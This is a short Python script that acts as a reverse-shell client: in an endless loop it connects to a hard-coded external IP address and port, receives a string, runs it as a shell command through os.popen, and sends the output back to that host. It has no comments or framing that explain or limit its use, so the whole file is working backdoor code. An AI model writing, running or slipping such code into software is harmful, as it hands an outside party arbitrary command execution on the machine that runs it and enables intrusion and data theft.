from math import*
import socket
import os
import sys

def change_str(string):
    return string[2:len(string) - 1]


class client:
    def __init__(self,return_cmd):
        
        # self.HOST = "192.168.219.111"
        # self.PORT = 3333
        self.HOST = "18.220.144.38"
        self.PORT = 9000
        self.return_cmd = return_cmd
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            sock.connect((self.HOST,self.PORT))
            # str(input)
            # sock.send("chorong \n".encode())

            self.received = sock.recv(1024)
            self.command_ = os.popen(self.received.decode()).read()
            sock.send(str(self.command_).encode())


            
            
        finally:
            sock.close()

        

        

        
cmd_read = ""


while True:
    a = client(cmd_read)
    # print(a.received[1:int(len(a.received))])
    
    

